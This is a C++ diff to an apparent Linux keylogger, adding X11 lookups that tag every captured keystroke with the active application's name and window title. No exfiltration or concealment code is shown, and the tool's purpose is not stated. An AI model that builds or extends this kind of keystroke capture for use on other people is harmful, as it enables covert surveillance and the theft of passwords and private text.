@@ -3,6 +3,7 @@
 #include <cerrno>
 #include <chrono>
 #include <cstdio>
+#include <cstring>
 #include <fcntl.h>
 #include <iostream>
 #include <string>
@@ -12,6 +13,11 @@
 #include <unistd.h>
 #include <linux/input.h>
 #include <linux/input-event-codes.h>
+
+#ifdef HAVE_X11
+#include <X11/Xlib.h>
+#include <X11/Xatom.h>
+#endif
 
 #include "keylogger_linux.hpp"
 
@@ -94,6 +100,128 @@ static std::string translateKeyCode(unsigned int code) {
         }
     }
 }
+
+// ---- active window info ----------------------------------------------------
+
+struct WindowInfo { std::string app; std::string title; };
+
+#ifdef HAVE_X11
+
+static Display* getDisplay() {
+    static Display* dpy = XOpenDisplay(nullptr);
+    return dpy;
+}
+
+static std::string x11GetStringProp(Display* dpy, Window win,
+                                    const char* propName,
+                                    const char* fallbackProp = nullptr) {
+    Atom prop = XInternAtom(dpy, propName, True);
+    if (prop == None && fallbackProp)
+        prop = XInternAtom(dpy, fallbackProp, True);
+    if (prop == None) return {};
+
+    Atom type = None;
+    int fmt = 0;
+    unsigned long nitems = 0, after = 0;
+    unsigned char* data = nullptr;
+
+    if (XGetWindowProperty(dpy, win, prop, 0, 1024, False, AnyPropertyType,
+                           &type, &fmt, &nitems, &after, &data) != Success || !data)
+        return {};
+
+    std::string result;
+    if (nitems > 0 && fmt == 8)
+        result.assign(reinterpret_cast<char*>(data), nitems);
+    XFree(data);
+
+    if (result.empty() && fallbackProp && std::strcmp(propName, fallbackProp) != 0) {
+        Atom fb = XInternAtom(dpy, fallbackProp, True);
+        if (fb != None && fb != prop) {
+            data = nullptr;
+            if (XGetWindowProperty(dpy, win, fb, 0, 1024, False, AnyPropertyType,
+                                   &type, &fmt, &nitems, &after, &data) == Success && data) {
+                if (nitems > 0 && fmt == 8)
+                    result.assign(reinterpret_cast<char*>(data), nitems);
+                XFree(data);
+            }
+        }
+    }
+    return result;
+}
+
+static Window x11GetActiveWindow(Display* dpy) {
+    Atom prop = XInternAtom(dpy, "_NET_ACTIVE_WINDOW", True);
+    if (prop == None) return None;
+
+    Atom type = None;
+    int fmt = 0;
+    unsigned long nitems = 0, after = 0;
+    unsigned char* data = nullptr;
+    Window root = DefaultRootWindow(dpy);
+
+    if (XGetWindowProperty(dpy, root, prop, 0, 1, False, XA_WINDOW,
+                           &type, &fmt, &nitems, &after, &data) != Success || !data)
+        return None;
+
+    Window win = None;
+    if (nitems > 0)
+        win = *(Window*)data;
+    XFree(data);
+    return win;
+}
+
+static WindowInfo getActiveWindowInfo() {
+    WindowInfo info;
+    Display* dpy = getDisplay();
+    if (!dpy) return info;
+
+    Window win = x11GetActiveWindow(dpy);
+    if (win == None) return info;
+
+    info.title = x11GetStringProp(dpy, win, "_NET_WM_NAME", "WM_NAME");
+
+    std::string wmClass = x11GetStringProp(dpy, win, "WM_CLASS", nullptr);
+    if (!wmClass.empty()) {
+        // WM_CLASS contains two null-terminated strings: instance\0class\0
+        // The second one (class) is typically the app name.
+        auto nul = wmClass.find('\0');
+        if (nul != std::string::npos && nul + 1 < wmClass.size())
+            info.app = wmClass.substr(nul + 1);
+        else
+            info.app = wmClass;
+        // Trim trailing null if present
+        while (!info.app.empty() && info.app.back() == '\0')
+            info.app.pop_back();
+    }
+    return info;
+}
+
+static WindowInfo getCachedWindowInfo() {
+    static Window lastWin = None;
+    static WindowInfo cached;
+    static auto lastRefresh = std::chrono::steady_clock::time_point{};
+
+    Display* dpy = getDisplay();
+    if (!dpy) return cached;
+
+    Window win = x11GetActiveWindow(dpy);
+    auto now = std::chrono::steady_clock::now();
+    bool changed = (win != lastWin);
+    bool stale = (now - lastRefresh) > std::chrono::milliseconds(500);
+
+    if (changed || stale) {
+        cached = getActiveWindowInfo();
+        lastWin = win;
+        lastRefresh = now;
+    }
+    return cached;
+}
+
+#else // !HAVE_X11
+
+static WindowInfo getCachedWindowInfo() { return {}; }
+
+#endif // HAVE_X11
 
 // ---- keyboard detection ----------------------------------------------------
 
@@ -215,6 +343,10 @@ void LinuxKeylogger::threadLoop() {
                     std::chrono::duration_cast<std::chrono::milliseconds>(
                         std::chrono::system_clock::now().time_since_epoch()).count());
                 ke.keyDown = (ie.value == 1);
+
+                auto wi = getCachedWindowInfo();
+                ke.appName     = std::move(wi.app);
+                ke.windowTitle = std::move(wi.title);
 
                 std::lock_guard<std::mutex> lk(m_mu);
                 if (m_callback) m_callback(ke);
